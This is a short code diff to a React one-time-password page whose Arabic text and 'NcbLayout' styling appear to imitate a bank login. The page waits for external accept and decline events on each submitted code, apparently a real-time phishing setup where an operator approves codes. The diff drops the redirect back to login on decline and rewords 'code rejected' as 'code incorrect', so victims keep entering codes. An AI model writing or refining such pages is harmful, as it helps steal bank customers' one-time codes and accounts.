@@ -19,7 +19,6 @@ export default function OtpPage() {
     acceptEvent: "acceptLoginOtp",
     declineEvent: "declineLoginOtp",
     onAccept: () => navigate("/success"),
-    onDecline: () => navigate("/login"),
   });
 
   const handleSubmit = async (e) => {
@@ -59,7 +58,7 @@ export default function OtpPage() {
 
   const displayError =
     localError ||
-    (error ? "تم رفض رمز التحقق" : "");
+    (error ? "رمز التحقق غير صحيح" : "");
 
   return (
     <NcbLayout>
@@ -69,7 +68,7 @@ export default function OtpPage() {
           الرمز لإتمام العملية الخاصة بك
         </p>
 
-        {displayError && <div className="ncb-error">{displayError}</div>}
+        {displayError && <div className="ncb-error mb-5">{displayError}</div>}
 
         <input
           className="ncb-input"
